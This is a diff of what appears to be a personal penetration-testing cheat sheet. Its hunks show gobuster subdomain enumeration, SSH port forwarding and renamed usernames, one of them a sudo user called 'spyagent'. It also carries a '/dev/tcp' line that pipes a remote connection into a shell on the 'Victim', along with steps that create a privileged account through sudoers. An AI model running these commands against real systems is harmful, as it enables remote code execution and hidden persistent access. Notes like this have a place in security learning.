@@ -12,6 +12,7 @@
 
 1. gobuster vhost -u example.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 4 --append-domain
 2. gobuster dns -d example.com -w /usr/share/seclists/Discovery/DNS/subdomains=top1million-5000.txt -t 10 
+_____________________________________________________________________________________________________________________________________________________________________________
 ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 ## Dirsearch directory find:
 
@@ -72,15 +73,15 @@ cat < /dev/tcp/10.10.10.10/80 | sh #Victim
 
 ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 # Port Forwarding using SSH
-    ssh -L 8888:localhost:8080 rajesh@34.44.2.255 (with password)
+    ssh -L 8888:localhost:8080 karthik@34.44.2.255 (with password)
  ssh -i private_key -L 8888:localhost:8080 username@targetip (with private key)
  (above syntax -L 8888(our machine port):localhost:8080(target machine localhost and ip to forward)
 
 ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- 
    
 # for adding a new user:
-sudo adduser cyber
-sudo usermod -aG sudo cyber
+sudo adduser spyagent
+sudo usermod -aG sudo spyagent
 nano /etc/sudoers    #(adding user to sudoers file to get su permission)
 usrname  ALL=(ALL:ALL) ALL
 
